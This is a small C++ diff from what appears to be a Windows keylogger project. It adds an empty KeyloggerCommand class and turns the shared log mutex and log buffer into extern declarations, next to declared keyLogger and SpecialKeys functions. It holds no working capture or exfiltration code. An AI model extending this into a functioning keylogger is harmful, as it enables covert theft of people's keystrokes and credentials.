@@ -3,11 +3,15 @@
 #include <windows.h>
 #include <fstream>
 #include <mutex>
+#include "serviceCommand.h"
 
-std::mutex logMutex;
-std::string logData;
+extern std::mutex logMutex;
+extern std::string logData;
 
 namespace Services {
+    class KeyloggerCommand : public Command {
+
+    };
     bool keyLogger(const std::string &saveFile);
 }
 bool SpecialKeys(int S_Key);
